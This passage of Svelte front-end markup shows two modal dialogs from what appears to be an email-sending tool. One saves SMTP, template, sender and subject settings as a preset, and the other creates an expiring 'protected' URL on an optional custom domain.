		<div class="w-full max-w-sm rounded-xl border border-[var(--border)] bg-[var(--card)] p-5 shadow-2xl" onclick={(e) => e.stopPropagation()}>
			<h3 class="text-sm font-semibold text-[var(--foreground)]">Save as Preset</h3>
			<p class="mt-1 text-xs text-[var(--muted-foreground)]">Save current SMTP, template, sender, and subject</p>
			<input bind:value={presetName} type="text" placeholder="Preset name" class="mt-4 w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
			<div class="mt-4 flex justify-end gap-2">
				<button onclick={() => (showSavePreset = false)} class="rounded-md border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] hover:bg-[var(--accent)]">Cancel</button>
				<button onclick={savePreset} disabled={!presetName.trim()} class="btn-accent px-3 py-1.5 text-xs disabled:opacity-50">Save</button>
			</div>
		</div>
	</div>
{/if}

<!-- Add URL -->
{#if showAddUrl}
	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (showAddUrl = false)}>
		<div class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-5 shadow-2xl" onclick={(e) => e.stopPropagation()}>
			<h3 class="text-base font-semibold text-[var(--foreground)]">Create Protected URL</h3>
			<div class="mt-4 space-y-3">
				<div>
					<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Original URL</label>
					<input bind:value={newUrlOriginal} type="text" placeholder="https://example.com/page" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
				</div>
				<div>
					<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Domain (optional)</label>
					<input bind:value={newUrlDomain} type="text" placeholder="links.example.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
				</div>
				<div>
					<label for="newUrlExpires" class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Expires In (seconds)</label>
					<input id="newUrlExpires" bind:value={newUrlExpires} type="number" min="0" step="60" placeholder="Leave empty for no expiration" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
					<p class="mt-1 text-[10px] text-[var(--text-tertiary)]">e.g. 3600 = 1 hour, 86400 = 1 day</p>
				</div>
			</div>
			<div class="mt-5 flex justify-end gap-2">
				<button onclick={() => (showAddUrl = false)} class="rounded-md border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] hover:bg-[var(--accent)]">Cancel</button>
				<button onclick={addUrl} disabled={!newUrlOriginal.trim()} class="btn-accent px-3 py-1.5 text-xs disabled:opacity-50">Create URL</button>
			</div>
		</div>
	</div>
{/if}
